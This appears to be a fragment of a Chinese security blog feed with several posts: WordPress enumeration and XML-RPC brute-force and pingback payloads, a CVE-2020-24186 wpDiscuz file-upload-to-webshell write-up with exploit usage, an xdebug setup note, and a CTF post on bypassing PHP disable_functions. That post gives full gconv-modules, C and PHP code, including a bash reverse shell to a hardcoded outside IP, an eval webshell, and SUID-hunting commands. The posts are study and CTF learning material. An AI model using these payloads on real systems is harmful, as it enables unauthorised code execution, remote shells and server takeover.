class="headerlink" title="Active enumeration"></a>Active enumeration</h3><h4 id="Users"><a href="#Users" class="headerlink" title="Users"></a>Users</h4><pre class="line-numbers language-none"><code class="language-none">curl -s -I -X GET http:&#x2F;&#x2F;blog.example.com&#x2F;?author&#x3D;1curl http:&#x2F;&#x2F;blog.example.com&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="XML-RPC"><a href="#XML-RPC" class="headerlink" title="XML-RPC"></a>XML-RPC</h4><p>If <code>xml-rpc.php</code> is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (You can automate this process<a href="https://github.com/relarizky/wpxploit"> using this</a> for example).</p><p>To see if it is active try to access to <strong><code>/xmlrpc.php</code></strong> and send(POST) this request:</p><pre class="line-numbers language-none"><code class="language-none">&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;&#x2F;methodName&gt;&lt;params&gt;&lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt;&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;&#x2F;methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;admin&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;param&gt;&lt;value&gt;pass&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt;&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;&#x2F;methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http:&#x2F;&#x2F;&lt;YOUR SERVER &gt;:&lt;port&gt;&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http:&#x2F;&#x2F;&lt;SOME VALID BLOG FROM THE SITE &gt;&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="x2F-wp-json-x2F-oembed-x2F-1-0-x2F-proxy-SSRF"><a href="#x2F-wp-json-x2F-oembed-x2F-1-0-x2F-proxy-SSRF" class="headerlink" title="&#x2F;wp-json&#x2F;oembed&#x2F;1.0&#x2F;proxy - SSRF"></a>&#x2F;wp-json&#x2F;oembed&#x2F;1.0&#x2F;proxy - SSRF</h3><p>Try to access <em><code>https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net</code></em> and the Worpress site may make a request to you.</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wordpress </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-24186复现</title>
      <link href="/2022/04/05/cve-2020-24186-fu-xian/"/>
      <url>/2022/04/05/cve-2020-24186-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="WordPress评论插件wpDiscuz任意文件上传漏洞"><a href="#WordPress评论插件wpDiscuz任意文件上传漏洞" class="headerlink" title="WordPress评论插件wpDiscuz任意文件上传漏洞"></a>WordPress评论插件wpDiscuz任意文件上传漏洞</h1><h2 id="CVE-2020-24186"><a href="#CVE-2020-24186" class="headerlink" title="CVE-2020-24186"></a>CVE-2020-24186</h2><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>WordPress是一款能建立出色网站、博客或应用程序的开源软件。wpDiscuz是wordpress的一款创新，现代且功能丰富的评论插件，可充实使用wordpress所建立的网站评论部分。</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="漏洞危害："><a href="#漏洞危害：" class="headerlink" title="漏洞危害："></a>漏洞危害：</h3><p>wpDiscuz插件存在高危漏洞，此漏洞允许未经验证的攻击者在目标站点上传任意文件，包括php文件，可以实现远程代码执行。</p><h3 id="漏洞原因："><a href="#漏洞原因：" class="headerlink" title="漏洞原因："></a>漏洞原因：</h3><p>这个CVE主要是用户在目标站点进行评论时，可以进行上传图片文件进行评论，尝试文件上传后使用burpsuit抓包，可以向文件内容添加文件头如GIF89a，即刻上传成功。因为没有进行严格的过滤和文件名后缀的检测，中间过程有使用php的getimagesize函数来对上传文件进行判断执行，该函数返回结果中有文件大小和文件类型，如果用这个函数获取文件类型就会有问题，可以加上对应的图片文件头来伪造图片类型，因此即可上传php文件成功。</p><p>响应包中返回了文件上传后的路径，访问即可造成对应的命令执行漏洞。</p><p>综上，利用链为：在wpDiscuz模块上传php文件时使用burpsuit抓包，写入图片文件头，例GIF89a，在后面写入相应的webshell，上传后查看文件所在路径，访问即可达到远程命令执行。</p><h3 id="影响产品："><a href="#影响产品：" class="headerlink" title="影响产品："></a>影响产品：</h3><p>wpDiscuz 7.0.0 – 7.0.4</p><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>升级wpDiscuz版本。</p><p>isAllowedFileType函数中对extension后缀进行了检测，当MIME与后缀不一样时会在进入最后一步之前返回False，也就是说使用MIME的白名单来对上传文件的后缀进行了限制。</p><p><img src="/images/wpdiscuz/12.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/12.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><h2 id="漏洞调试环境搭建"><a href="#漏洞调试环境搭建" class="headerlink" title="漏洞调试环境搭建"></a>漏洞调试环境搭建</h2><p>Wordpress5.4.1下载地址：</p><p><a href="https://cn.wordpress.org/wordpress-5.4.1-zh_CN.tar.gz">https://cn.wordpress.org/wordpress-5.4.1-zh_CN.tar.gz</a></p><p>wpDiscuz7.0.4下载地址：</p><p><a href="https://downloads.wordpress.org/plugin/wpdiscuz.7.0.4.zip">https://downloads.wordpress.org/plugin/wpdiscuz.7.0.4.zip</a></p><p>在本机的windows环境下搭建：</p><p>1、下载phpstudy启动相应的web服务，提前在mysql建立一个wordpress数据库。</p><p>2、将wordpress解压到www目录下。</p><p>3、将wpDiscuz解压到WWW\wordpress\wp-content\plugins目录下。</p><p>4、访问wordpress按照步骤搭建网站。</p><p>5、进入到wordpress后台开启wpDiscuz插件即可。</p><h2 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h2><p>【详细分析过程，需要给出关键代码片段或截图】</p><p>上传图片文件尝试burpsuit抓包，发现是向wordpress&#x2F;wp-admin&#x2F;admin-ajax.php发送请求</p><p><img src="/images/wpdiscuz/1.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/1.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>于是去分析admin-ajax.php,一开始没有查到什么，后面发现require了ajax-actions.php</p><p><img src="/images/wpdiscuz/2.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/2.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>开始分析ajax-actions.php，定位到上传模块，在wp_ajax_upload_atachment这个函数里面，可以发现对上传文件的类型进行了限制，</p><p><img src="/images/wpdiscuz/3.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/3.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>一个个追溯分析肯定有点麻烦，于是接下来追踪一些有用的函数开始打上断点，然后上传文件一点一点进行debug调试，进行详细的解析，一路debug，最终确定能够造成漏洞点大致的结构如下：</p><p><img src="/%5Cimages/wpdiscuz/4.jpg" class="lazyload placeholder" data-srcset="/%5Cimages/wpdiscuz/4.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>上传一个php后缀的文件并且加上文件头GIF89a,从产生漏洞的地方开始追踪，可以全局搜索查看哪里使用了@getimagesize函数，最终发现在wp_get_image_mime函数里面，这里就因为文件头的伪造使最终return的mime变成了image&#x2F;gif。</p><p><img src="/images/wpdiscuz/5.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/5.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>继续追踪，返回到调用的函数，发现是先调用了isImage函数，再在里面调用了wp_get_image_mime函数。</p><p><img src="/images/wpdiscuz/6.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/6.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>在后续的检验中，持续绕过检测，成功上传文件</p><p><img src="/images/wpdiscuz/7.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/7.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>这里确定了mime类型后，由于是image&#x2F;gif，就会向$attachmentIds写入对应的值</p><p><img src="/images/wpdiscuz/8.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/8.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>最终根据$attachmentIds校验,成功写入返回包的数据，写入成功。</p><p><img src="/images/wpdiscuz/9.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/9.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>最后查看返回包的内容确定上传文件的路径，访问即可执行对应的webshell。</p><p><img src="/images/wpdiscuz/10.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/10.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><h2 id="武器化利用"><a href="#武器化利用" class="headerlink" title="武器化利用"></a>武器化利用</h2><p>有师傅已经写出来了，我就模仿着自己再写了一个，最终测试可以实现了上传webshell之后进行远程代码执行。  </p><p>源码：<a href="https://github.com/Sakura-501/CVE-2020-24186-exploit">https://github.com/Sakura-501/CVE-2020-24186-exploit</a></p><p>Exp使用方法：</p><p>Commands:</p><p>- Windows&#x2F;Linux:</p><p>python3 CVE-2020-24186.py -u <Base_Host> -p <BlogPost_URL> </p><p>Example：</p><p>python3 CVE-2020-24186.py -u <a href="http://127.0.0.1/">http://127.0.0.1</a> -p &#x2F;wordpress&#x2F;2022&#x2F;04&#x2F;04&#x2F;hello-world</p><p><img src="/images/wpdiscuz/11.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/11.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个cve早有师傅分析完了，我先看了一遍师傅们的分析，然后自己去搭建环境分析一遍又是不一样的收获，自己debug一遍会对这一个漏洞点有着更深刻的发现。一开始我按照师傅们的分享的思路分析，发现并不是很正确，于是自己去慢慢看源代码才发现师傅们更细节的地方并没有讲清楚，所以导致一开始的我看的不是很懂。比如一开始我不知道为什么可以加上GIF89a文件头就能上传成功，师傅们的文章也没有详细写清楚。于是自己不断下断点，慢慢debug，最后发现是在php的一个原生函数getimagesize出现了问题，可以进行文件头伪造绕过。所以漏洞挖掘的复现需要亲自实现一遍才会明白更多细节。</p><p>第一次写exploit，照着师傅们的exp我自己写了一遍，基本了解了python是如何进行exp的编写，自己也学习到了很多新的东西，比如Python的optparse可以解析脚本输入的参数值等等。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.cnblogs.com/sukusec301/p/15813117.html">https://www.cnblogs.com/sukusec301/p/15813117.html</a></p><p><a href="https://www.exploit-db.com/exploits/49962">https://www.exploit-db.com/exploits/49962</a></p><p><a href="https://blog.csdn.net/qq_40989258/article/details/108753535">https://blog.csdn.net/qq_40989258/article/details/108753535</a></p><p><a href="https://github.com/h3v0x/CVE-2020-24186-WordPress-wpDiscuz-7.0.4-RCE">https://github.com/h3v0x/CVE-2020-24186-WordPress-wpDiscuz-7.0.4-RCE</a></p><p><a href="https://www.pythonf.cn/read/158357">https://www.pythonf.cn/read/158357</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPSTORM如何进行项目的debug</title>
      <link href="/2022/04/04/phpstorm-ru-he-jin-xing-xiang-mu-de-debug/"/>
      <url>/2022/04/04/phpstorm-ru-he-jin-xing-xiang-mu-de-debug/</url>
      
        <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>因为要进行wordpress的cve复现，所以需要对某些代码进行debug，可以理解的更快一些，所以查询到PHPstorm可以利用xdebug来进行项目的debug，所以尝试了好长一段时间，终于算是成功了。</p><h3 id="借鉴文章"><a href="#借鉴文章" class="headerlink" title="借鉴文章"></a>借鉴文章</h3><p><a href="https://blog.csdn.net/weixin_39988164/article/details/116510119">https://blog.csdn.net/weixin_39988164/article/details/116510119</a></p><p><a href="https://ask.csdn.net/questions/781008">https://ask.csdn.net/questions/781008</a></p><p><a href="http://i.lckiss.com/?p=4370">http://i.lckiss.com/?p=4370</a></p><p><a href="https://blog.csdn.net/maxwoods/article/details/80458374">https://blog.csdn.net/maxwoods/article/details/80458374</a></p><p>还有一些比较坑的点：</p><p>xdebug断掉调试经常无故断开：</p><p><a href="https://blog.csdn.net/qq_26486949/article/details/88857757">https://blog.csdn.net/qq_26486949/article/details/88857757</a></p><p><a href="https://blog.csdn.net/qq_41566366/article/details/100898604">https://blog.csdn.net/qq_41566366/article/details/100898604</a></p><p>查阅以上文章，加上根据自己的本地环境进行一些更改之后，就基本可以进行debug了，大功告成！</p><h3 id="php-ini"><a href="#php-ini" class="headerlink" title="php.ini"></a>php.ini</h3><pre class="line-numbers language-none"><code class="language-none">[Xdebug]zend_extension&#x3D;D:&#x2F;phpstudty8.1&#x2F;phpstudy_pro&#x2F;Extensions&#x2F;php&#x2F;php8.0.2nts&#x2F;ext&#x2F;php_xdebug.dllxdebug.remote_enable&#x3D;Onxdebug.remote_host&#x3D;127.0.0.1xdebug.remote_port&#x3D;9003xdebug.remote_handler&#x3D;dbgpxdebug.remote_mode &#x3D; reqxdebug.mode&#x3D;debugxdebug.idekey&#x3D;PHPSTORMxdebug.collect_params&#x3D;1xdebug.collect_return&#x3D;1xdebug.auto_trace&#x3D;Offxdebug.trace_output_dir&#x3D;D:&#x2F;phpstudty8.1&#x2F;phpstudy_pro&#x2F;Extensions&#x2F;php_log&#x2F;php8.0.2nts.xdebug.tracexdebug.profiler_enable&#x3D;Offxdebug.profiler_output_dir&#x3D;D:&#x2F;phpstudty8.1&#x2F;phpstudy_pro&#x2F;Extensions&#x2F;php_log&#x2F;php8.0.2nts.xdebug.profiler<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> debug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用gconv_modules和iconv进行bypass disablele_function</title>
      <link href="/2022/04/03/li-yong-gconv-modules-he-iconv-jin-xing-bypass-disablele-function/"/>
      <url>/2022/04/03/li-yong-gconv-modules-he-iconv-jin-xing-bypass-disablele-function/</url>
      
        <content type="html"><![CDATA[<p>本文主要内容来源于</p><p><a href="https://blog.csdn.net/qq_42303523/article/details/117911859">使用GCONV_PATH与iconv进行bypass disable_functions</a></p><p><a href="https://blog.csdn.net/nicholas_duan/article/details/84397431">linux 什么是SO文件</a></p><p>相关赛题两个wp学习：</p><p><a href="https://erroratao.github.io/writeup/DASCTF2022xSU/">dasctf2022-upgdload</a></p><p><a href="https://blog.csdn.net/weixin_51458899/article/details/123782291">dasctf2022-upgdload的关于php:&#x2F;&#x2F;filter的妙用</a></p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><code>glibc</code>：<em>glibc</em>是GNU发布的libc库，即c运行库。<em>glibc</em>是linux系统中最底层的api，几乎其它任何运行库都会依赖于<em>glibc</em>。<em>glibc</em>除了封装linux操作系统所提供的系统服务外，它本身也提供了许多其它一些必要功能服务的实现。  </p><p><code>.so文件</code>：shared object，so文件是Linux下的程序函数库,即编译好的可以供其他程序使用的代码和数据，与windows下的dll文件差不多，就是常说的动态链接库，都是c或c++编译出来的。  也是ELF格式文件，共享库（动态库），类似于DLL。节约资源，加快速度，代码升级简化。 </p><p><code>GCONV_PATH</code>：linux系统下的一个环境变量，该环境变量能使glibc使用用户自定义的gconv-modules文件  </p><p>怎么生成以及使用一个so动态库文件? <code>gcc -fPIC -g -c s.c -o libs.o </code>  </p><p><code>-fPIC</code>：-fPIC作用于编译阶段，告诉编译器产生与位置无关代码(Position-Independent Code)，则产生的代码中，没有绝对地址，全部使用相对地址，故而代码可以被加载器加载到内存的任意 位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的。  </p><p><code>-g</code>:令 gcc 生成调试信息,该选项可以利用操作系统的“原生格式（native format）”生成调试信息。GDB 可以直接利用这个信息，其它调试器也可以使用这个调试信息。  </p><p><code>-c</code>：仅执行编译操作，不进行连接操作。</p><p><code>-o</code>：指定生成的输出文件名称 。</p><h4 id="主要流程："><a href="#主要流程：" class="headerlink" title="主要流程："></a>主要流程：</h4><p>·linux环境下，php在执行<code>iconv</code>函数时会去调用<code>glibc</code>的<code>iconv_open</code>函数  </p><p>·iconv_open函数会首先去寻找系统提供的gconv-modules文件，这个文件包含了所有字符集的相关信息存储路径，每个字符集信息都存储在一个.so文件中，即gconv-modules文件提供每一个字符集的.so文件的详细位置。</p><p>·然后查询到位置之后就去调用对应的.so文件</p><p>·然后调用.so文件中的gconv和gconv_init函数，达到命令注入的目的</p><h3 id="bypass主要过程"><a href="#bypass主要过程" class="headerlink" title="bypass主要过程"></a>bypass主要过程</h3><p>首先一般在&#x2F;tmp文件夹下面上传gconv-modules文件，文件中指定我们自定义的的字符集.so文件，.so文件中书写gconv_init函数，其中填入我们需要执行的系统命令或其他危险操作。然后我们需要上传一个php的shell，里面先指定gconv_path来指向我们自己上传的gconv-modules文件，最后调用iconv函数来执行我们的恶意代码。</p><h4 id="实战模拟"><a href="#实战模拟" class="headerlink" title="实战模拟"></a>实战模拟</h4><p>首先写一个gconv-modules文件上传到&#x2F;tmp目录下</p><pre class="line-numbers language-none"><code class="language-none">module  INTERNAL    自定义字符集名字（大写）&#x2F;&#x2F;    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;自定义字符集名字（小写）    2 module  自定义字符集名字（大写）&#x2F;&#x2F;    INTERNAL    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;自定义字符集名字（小写）    2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后写.c文件  </p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">gconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">gconv_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"希望执行的命令"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>gcc编译成.so文件,并且也要上传到&#x2F;tmp目录下</p><p><code>gcc 源代码文件名.c -o 自定义字符集名.so -shared -fPIC</code>  </p><p>最后书写php的shell.php，上传到&#x2F;tmp目录下访问执行即可</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GCONV_PATH=/tmp/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"自定义字符集名"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"UTF-8"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"whatever"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="真实操作"><a href="#真实操作" class="headerlink" title="真实操作"></a>真实操作</h4><p>例如有个靶场源代码如下，需要bypass disable_function：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ant'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>首先使用蚁剑连接，发现没有无法执行命令，需要bypass  </p><p>上传gconv-modules文件到&#x2F;tmp目录下：  </p><pre class="line-numbers language-none"><code class="language-none">module  HACK&#x2F;&#x2F;    INTERNAL    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;hack    2module  INTERNAL    HACK&#x2F;&#x2F;    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;hack    2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>再写hack.c文件，使用linux系统执行编译为.so文件：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">gconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">gconv_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/readflag > /tmp/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//反弹shell写法</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">gconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">gconv_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'exec bash -i &amp;>/dev/tcp/175.178.47.228/8888 &lt;&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>gcc hack.c -o hack.so -shared -fPIC</code>  </p><p>生成的hack.so要上传到&#x2F;tmp目录下</p><p>然后写shell.php文件，上传到&#x2F;var&#x2F;www&#x2F;html目录下：  </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GCONV_PATH=/tmp/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hack"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"UTF-8"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"whatever"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>最后访问&#x2F;shell.php触发函数调用即可看到flag文件在&#x2F;tmp文件夹下生成！</p><h3 id="有关于php-x2F-x2F-filter的妙用"><a href="#有关于php-x2F-x2F-filter的妙用" class="headerlink" title="有关于php:&#x2F;&#x2F;filter的妙用"></a><strong>有关于php:&#x2F;&#x2F;filter的妙用</strong></h3><p>使用filter协议编码主动去调用.so文件，达到命令注入的目的</p><p><code>a=putenv(&quot;GCONV_PATH=/tmp/&quot;);include(&#39;php://filter/read=convert.iconv.exp.utf-8/resource=/tmp/exp.so&#39;);</code></p><h3 id="寻找拥有root权限的命令执行"><a href="#寻找拥有root权限的命令执行" class="headerlink" title="寻找拥有root权限的命令执行"></a>寻找拥有root权限的命令执行</h3><p><a href="https://blog.gtwang.org/linux/unix-linux-find-command-examples/">有关find指令参数的学习</a></p><p><a href="http://www.51gjie.com/linux/1015.html">ls -l指令详解</a></p><pre class="line-numbers language-none"><code class="language-none">-user         &#x2F;&#x2F;根据属主来查找文件find . -type f &#x2F;&#x2F;将当前目录及其子目录中的所有文件列出&#x2F;dev&#x2F;null是一个特殊的设备文件，这个文件接收到任何数据都会被丢弃。因此，null这个设备通常也被称为位桶（bit bucket）或黑洞。所以，2&gt;&#x2F;dev&#x2F;null的意思就是将标准错误stderr删掉。find . -perm 664 便是在当前文件夹下查找 owner，group有读写权限，而其他用户只有读不能写的文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一星期水铜</title>
      <link href="/2022/03/30/yi-xing-qi-shui-tong/"/>
      <url>/2022/03/30/yi-xing-qi-shui-tong/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="d07a36dcf047153f01a8f406a2372648cdd644c674fcc735252a8d022111f96e">2cf9f0e39f26ddd937cd5eb31197d2f7452e35fa3efd28f8064b690826064841860dc90b0ea8c0ba6cbd42298ac781e59e7051af512eb8ae324cf1d4c26087742a2a20035ce7f29a2f492152b74db6a7746399a1d926406362762ff6725ce76f88e836f0f318d24c045eca9b71cd243a7998ab3bf4135c5f1e4265f04cda2df0ef2ce4b0ffef482ec55098aac38cd152757c300938bbb076a74682c5b26b1049ab249be8a7a0b330823ab99ca39726b0da0eb18048609a95374d79d470936b8afddc3a9041b389eefb36e6a9ae5340cb04fa9bb5c16a649b64c41f7de25cd283e8cb0f83cfdf00d6f6bcdded2813a932e2a01394ce7adfb19ca9a0f2b60329485024c8a37cc089416ba578b6093d46d94925d27171855e7ec652c1e80d9c543f8051b17a908efd3c190a157ff99f35adb5bdbfa591b23cbeefddf7da18bef7c75ce17dbab19e9ffc2f76d54a81c745424fab33b9d9542a1e68c7cc89b3f37be326548b688ced1daad6f56cf167602e253688e730aa0ad86dc52f5f380364f78011cb6c5fea011be24ee9458c1621f87f4fe9abe8d897a434042e4fa78a761d4734bd277e303d7333f0ffabc2d39dc72ce3e23a96d1a2a3f4f7a6aa03c3cacaad83d2e6f22ddfa83262eff8a9a7ceb827c8577f51a021a3884363436f85f1fb5265f8a63a6a4f049a53abddb9fa3b2340d3156d2129188898f661861d630a6a8802ce2916d74770c2cce62f34ecbca803c81d8ba3ed23e0df83d73cbd777a37684289f09690f23a8fc148a310f0af4421e6c65bdf31c85b5b73409b55dea9464b2b01c89cd91ceae60f0f6bd1d2831a5e4157c3a88df17ddd5fe2dff74d3d8f1b329e79eb0a035016e8e5b3aeef317d983ee7dc2cfa1a35cc15615c4118be3c363f7d67a29d2a7b2d32dfccbac2d89be87d78fa7758d3ea47071c2d7c39636efa69d5296eabcb979a32a550df18f67e439eb433a1d3a107628bde2f60958075a218f85155881a5351f10c08d79565481bc1e3758c879d25d1025d74c3a4ce00c8cbc018eb58887b04c5bdca7e1753de9cc979709760b3356215c4b52db206d9e6e842313758d856884b8574101149ce3e283894e61efa75e